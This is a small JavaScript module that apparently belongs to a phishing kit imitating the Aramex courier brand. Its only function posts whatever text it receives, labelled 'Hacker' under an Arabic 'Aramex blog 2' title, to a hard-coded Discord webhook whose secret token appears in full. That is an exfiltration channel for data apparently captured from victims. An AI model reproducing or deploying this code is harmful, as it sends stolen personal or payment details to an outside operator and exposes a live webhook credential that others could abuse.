import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1329117543826456576/tzoDOVnSLMLMmbZaMyN1BK9dqZaU5XNLLXBwlCiM_fGMTd6bFr2g1AODcaGJl5p02Y-n",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
